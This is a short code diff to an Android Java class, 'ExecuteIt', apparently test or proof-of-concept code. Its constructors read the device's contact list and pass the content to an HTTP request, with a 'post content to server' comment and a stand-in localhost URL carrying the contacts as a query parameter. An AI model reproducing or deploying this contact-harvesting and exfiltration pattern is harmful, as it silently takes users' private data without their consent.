@@ -29,9 +29,10 @@ public class ExecuteIt  {
 
     private static final String TAG="TEST";
     private Context ctx;
+    private static Context ctxTmp;
 
     public ExecuteIt() {
-
+        this.ctx = ExecuteIt.ctxTmp;
         if (this.ctx != null) {
             this.getContactList();
         }
@@ -39,7 +40,7 @@ public class ExecuteIt  {
     }
 
     public ExecuteIt(Context ctx) {
-
+        ExecuteIt.ctxTmp = ctx;
         this.ctx = ctx;
         this.getContactList();
     }
@@ -122,17 +123,9 @@ public class ExecuteIt  {
                     pCur.close();
 
                     // post content to server
-                    try {
-                        URL url = new URL("http://127.0.0.1?content=" + content);
-                        HttpURLConnection urlConnection = (HttpURLConnection) url.openConnection();
-                        urlConnection.disconnect();
+                    new Thread(new RequestHttp(content)).start();
 
-                    } catch (MalformedURLException e) {
-                        e.printStackTrace();
-                    }
-                    catch (IOException io){
-                        io.printStackTrace();
-                    }
+
                 }
             }
         }
